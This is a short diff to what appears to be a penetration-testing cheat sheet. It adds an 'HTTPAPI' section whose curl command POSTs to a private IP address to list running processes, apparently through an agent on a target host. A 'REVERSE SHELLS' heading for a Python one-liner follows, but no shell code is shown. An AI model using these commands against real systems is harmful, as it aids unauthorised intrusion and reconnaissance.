@@ -455,7 +455,10 @@ if you happen to get unto an ancient windows machine that needs to execute 32 bi
 32-bit (x86) Powershell ISE executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
 64-bit (x64) Powershell ISE executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
 ```
-
+# HTTPAPI
+```
+curl -d "" -X POST http://192.168.130.99:33333/list-running-procs
+```
 # REVERSE SHELLS
 ### THE ONELINER PYTHON ***GOLDEN***
 ```bash
